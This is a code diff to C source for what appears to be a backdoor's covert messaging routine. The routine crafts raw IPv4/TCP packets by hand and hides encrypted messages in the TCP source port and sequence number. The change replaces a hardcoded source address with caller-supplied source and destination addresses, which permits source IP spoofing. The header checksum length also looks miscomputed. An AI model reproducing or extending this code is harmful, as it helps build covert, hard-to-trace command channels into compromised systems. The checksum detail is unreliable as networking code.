@@ -17,7 +17,9 @@
  * source port.
  *
  * Params:
- *      const struct in_addr address: The address of the backdoor.
+ *      const struct in_addr src: The source address to use.
+ *
+ *      const struct in_addr dst: The destination address to use.
  *
  *      const unsigned short port: The value to be used for the TCP source port.
  * The TCP sequence number will be derived from this.
@@ -25,8 +27,8 @@
  *      const char *msg: The message to encrypt and send. const int msg_len: The
  * length of the message to send.
  */
-void send_message_to_ip(const struct in_addr address, const unsigned short port,
-                        char *msg, int msg_len)
+void send_message_to_ip(const struct in_addr src, const struct in_addr dst,
+                        const unsigned short port, char *msg, int msg_len)
 {
     const int SEND_FLAGS = 0;
     int sock;
@@ -44,7 +46,7 @@ void send_message_to_ip(const struct in_addr address, const unsigned short port,
         return;
 
     // create ip header
-    fill_iphdr(&send_tcp.ip, address);
+    fill_iphdr(&send_tcp.ip, src, dst);
 
     // create tcp header
     fill_tcphdr(&send_tcp.tcp, rand() & 0xFFFF, port);
@@ -85,13 +87,12 @@ void send_message_to_ip(const struct in_addr address, const unsigned short port,
  * Params:
  *      struct iphdr* hdr: The IPv4 header structure to fill.
  *
- *      const struct in_addr address; The destination address to use.
+ *      const struct in_addr src; The source address to use.
+ *
+ *      const struct in_addr dst; The destination address to use.
  */
-void fill_iphdr(struct iphdr *hdr, const struct in_addr address)
+void fill_iphdr(struct iphdr *hdr, const struct in_addr src, const struct in_addr dst)
 {
-    struct in_addr src_addr;
-    inet_pton(AF_INET, SOURCE_ADDR, &src_addr.s_addr);
-
     hdr->ihl = 5;
     hdr->version = 4;
     hdr->tos = 0;
@@ -100,8 +101,8 @@ void fill_iphdr(struct iphdr *hdr, const struct in_addr address)
     hdr->ttl = 64;
     hdr->protocol = IPPROTO_TCP;
     hdr->check = 0;
-    hdr->saddr = src_addr.s_addr;
-    hdr->daddr = address.s_addr;
+    hdr->saddr = src.s_addr;
+    hdr->daddr = dst.s_addr;
     hdr->check = in_cksum((unsigned short *)hdr, hdr->ihl * 5);
 }
 
